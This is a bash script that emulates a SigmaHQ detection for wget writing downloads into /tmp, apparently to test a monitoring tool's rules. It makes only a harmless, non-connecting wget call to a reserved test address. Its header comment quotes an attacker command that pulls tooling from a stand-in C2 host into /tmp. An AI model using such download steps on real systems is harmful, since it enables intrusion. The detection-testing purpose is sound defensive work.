#!/usr/bin/env bash
# sigmahq_fe_wget_tmp.sh - benign SigmaHQ FILE_EVENT emulation.
#
# This exercises the file_event layer (see sigmahq_fe_ebpfbackdoor.sh header):
# the write is only visible to banken because the watched file is in
# services.banken.audit.watchPaths. Unlike the other file_event rules this one
# also keys on the WRITING PROCESS (Image endswith /wget), so the file event must
# be produced by wget itself.
#
# What an attacker does: download tooling into a temp dir with wget (T1105), e.g.
# `wget http://c2/x -O /tmp/x`. The SigmaHQ rule keys on a file event whose Image
# ends '/wget' and whose TargetFilename starts with '/tmp/' or '/var/tmp/'.
# Harmless analogue: `wget -O <watched /tmp path>` against a TEST-NET-1 address
# with a 1s timeout - no connection is made, but wget creates (opens for write)
# the empty output file first, which is the watched write event. The file is then
# removed. The proc_creation wget_download_suspicious_directory rule (wget with
# -O into /tmp) fires alongside as its legitimate twin.
#
# Imitates (SigmaHQ): file_event_lnx_wget_download_file_in_tmp_dir.yml - ATT&CK T1105
# Expected rules: file_event_lnx_wget_download_file_in_tmp_dir, proc_creation_lnx_wget_download_suspicious_directory
set -u

command -v wget >/dev/null 2>&1 || { echo "BANKEN-EMUL-SKIP: no wget"; exit 0; }

# Fixed path (not PID-suffixed) so the harness can watch this exact file.
dst="/tmp/bk-wget-fe"
wget -O "$dst" --timeout=1 --tries=1 http://192.0.2.1/ >/dev/null 2>&1 || true
rm -f "$dst" 2>/dev/null || true

exit 0
